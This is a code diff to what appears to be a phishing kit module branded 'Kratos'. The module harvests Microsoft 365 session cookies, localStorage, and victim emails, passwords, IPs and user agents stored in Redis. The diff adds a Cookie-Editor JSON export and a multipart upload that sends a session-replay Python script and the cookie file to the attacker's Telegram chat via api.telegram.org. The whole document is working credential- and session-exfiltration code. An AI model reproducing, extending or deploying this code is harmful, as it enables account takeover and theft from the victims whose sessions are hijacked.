@@ -104,7 +104,7 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
     }
     await necrohelp.Sleep(3000)
 
-    // 2. Collect cookies from all MS domains (main page stays where it is)
+    // 2. Collect cookies from all MS domains
     const MS_DOMAINS = [
         'https://login.microsoftonline.com', 'https://login.live.com',
         'https://outlook.office.com', 'https://outlook.office365.com',
@@ -154,7 +154,7 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
     }
     console.log(`[${taskId}] localStorage origins: ${originStorages.length}`)
 
-    // 4. Victim details from Redis: email, password, IP, UA
+    // 4. Victim details from Redis
     let victimEmail = null, victimPass = null, victimIP = null, victimUA = null, victimUUID = null
     try {
         const { createClient: _rc1 } = require('redis')
@@ -192,11 +192,9 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
                 }).on('error', rej)
             })
             geoCity = geo.city || 'Unknown'; geoCountry = geo.country || ''
-        } catch(e) { console.log(`[${taskId}] GeoIP: ${e.message}`) }
+        } catch(e) {}
     }
     const location = [geoCity, geoCountry].filter(Boolean).join(' - ')
-
-    // 6. Browser + account type
     const ua = victimUA || ''
     const browserName = ua.includes('Edg/') ? 'Edge' : ua.includes('Chrome/') ? 'Chrome'
         : ua.includes('Firefox/') ? 'Firefox' : ua.includes('Safari/') ? 'Safari' : 'Unknown'
@@ -205,7 +203,7 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
     const dateStr = new Date().toLocaleString('en-US',{weekday:'short',year:'numeric',month:'short',day:'2-digit',hour:'2-digit',minute:'2-digit'})
 
     if (params.telegramToken && params.telegramChatId) {
-        // 7. Dedup
+        // 6. Dedup
         let alreadySent = false
         if (victimEmail) {
             try {
@@ -224,8 +222,9 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
                 const TelegramBot = require('node-telegram-bot-api')
                 const bot = new TelegramBot(params.telegramToken, { polling: false })
                 const chatIds = Array.isArray(params.telegramChatId) ? params.telegramChatId : [params.telegramChatId]
+                const safeLabel = label.replace(/[@.]/g,'_').replace(/[^a-zA-Z0-9_]/g,'')
 
-                // Build storageState
+                // ── Build Playwright storageState .py ──
                 const cookieArr = allCookies.map(c => ({
                     Name: c.name, Value: c.value, Domain: c.domain,
                     Path: c.path||'/', Secure: c.secure||false,
@@ -233,7 +232,6 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
                 }))
                 const storageState = { cookies: cookieArr, origins: originStorages }
                 const b64 = Buffer.from(JSON.stringify(storageState)).toString('base64')
-                const safeLabel = label.replace(/[@.]/g,'_').replace(/[^a-zA-Z0-9_]/g,'')
 
                 const pyScript = [
                     '#!/usr/bin/env python3',
@@ -271,6 +269,25 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
                     'asyncio.run(main())'
                 ].join('\n')
 
+                // ── Build Cookie-Editor JSON ──
+                // SameSite mapping: Puppeteer 'none' -> Cookie-Editor 'no_restriction'
+                const sameSiteMap = { none: 'no_restriction', lax: 'lax', strict: 'strict' }
+                const cookieEditorArr = allCookies.map(c => ({
+                    name:           c.name,
+                    value:          c.value,
+                    domain:         c.domain,
+                    path:           c.path || '/',
+                    secure:         c.secure || false,
+                    httpOnly:       c.httpOnly || false,
+                    sameSite:       sameSiteMap[(c.sameSite||'none').toLowerCase()] || 'no_restriction',
+                    expirationDate: (c.expires && c.expires > 0) ? c.expires : undefined,
+                    session:        !(c.expires && c.expires > 0),
+                    hostOnly:       !c.domain.startsWith('.'),
+                    storeId:        '0'
+                }))
+                const jsonFile = JSON.stringify(cookieEditorArr, null, 2)
+
+                // ── Info message ──
                 const infoMsg = [
                     `[Kratos]- OFFICE VALID [ ${label} ] ❤️`,
                     `⚡ Email: ${label}`,
@@ -284,14 +301,62 @@ exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
                     `Browser: ${browserName}`,
                     `Location: ${location}`,
                     `Date: ${dateStr}`,
-                    `GOD-OF-WAR!`
+                    `GOD-OF-WAR!`,
+                    ``,
+                    `📦 ${safeLabel}.py  → Playwright (pip install playwright)`,
+                    `🍪 ${safeLabel}.json → Cookie-Editor extension (no Python needed)`
                 ].join('\n')
 
-                const filename = `${safeLabel}.py`
+                // sendMediaGroup: one message, two document attachments, caption on first
+                // Built with Node built-ins only — no form-data dependency
+                const sendMediaGroup = (token, chatId, caption, pyBuf, pyName, jsonBuf, jsonName) => {
+                    return new Promise((res, rej) => {
+                        const https = require('https')
+                        const boundary = '----TGBoundary' + Math.random().toString(36).slice(2)
+                        const CRLF = '\r\n'
+                        const enc = s => Buffer.from(s)
+                        const parts = []
+                        const mediaJson = JSON.stringify([
+                            { type: 'document', media: 'attach://pyfile', caption },
+                            { type: 'document', media: 'attach://jsonfile' }
+                        ])
+                        const fields = [
+                            ['chat_id', String(chatId), 'text/plain'],
+                            ['media',   mediaJson,      'text/plain'],
+                        ]
+                        for (const [name, val] of fields) {
+                            parts.push(enc(`--${boundary}${CRLF}Content-Disposition: form-data; name="${name}"${CRLF}${CRLF}${val}${CRLF}`))
+                        }
+                        parts.push(enc(`--${boundary}${CRLF}Content-Disposition: form-data; name="pyfile"; filename="${pyName}"${CRLF}Content-Type: text/x-python${CRLF}${CRLF}`))
+                        parts.push(pyBuf)
+                        parts.push(enc(CRLF))
+                        parts.push(enc(`--${boundary}${CRLF}Content-Disposition: form-data; name="jsonfile"; filename="${jsonName}"${CRLF}Content-Type: application/json${CRLF}${CRLF}`))
+                        parts.push(jsonBuf)
+                        parts.push(enc(`${CRLF}--${boundary}--${CRLF}`))
+                        const body = Buffer.concat(parts)
+                        const req = https.request({
+                            hostname: 'api.telegram.org',
+                            path: `/bot${token}/sendMediaGroup`,
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': `multipart/form-data; boundary=${boundary}`,
+                                'Content-Length': body.length
+                            }
+                        }, r => { let d = ''; r.on('data', c => d += c); r.on('end', () => res(JSON.parse(d))) })
+                        req.on('error', rej)
+                        req.write(body)
+                        req.end()
+                    })
+                }
+
                 for (const chatId of chatIds) {
-                    await bot.sendMessage(chatId, infoMsg)
-                    await bot.sendDocument(chatId, Buffer.from(pyScript), {}, { filename, contentType: 'text/x-python' })
-                    console.log(`[${taskId}] delivered to ${chatId}: ${filename} cookies=${allCookies.length} ls=${originStorages.length}`)
+                    const result = await sendMediaGroup(
+                        params.telegramToken, chatId, infoMsg,
+                        Buffer.from(pyScript),  `${safeLabel}.py`,
+                        Buffer.from(jsonFile),  `${safeLabel}.json`
+                    )
+                    if (!result.ok) console.log(`[${taskId}] sendMediaGroup error: ${JSON.stringify(result)}`)
+                    console.log(`[${taskId}] delivered to ${chatId}: single message + .py + .json (${allCookies.length} cookies, ${originStorages.length} ls origins)`)
                 }
             } catch(e) { console.log(`[${taskId}] Telegram error: ${e.message}`) }
         }
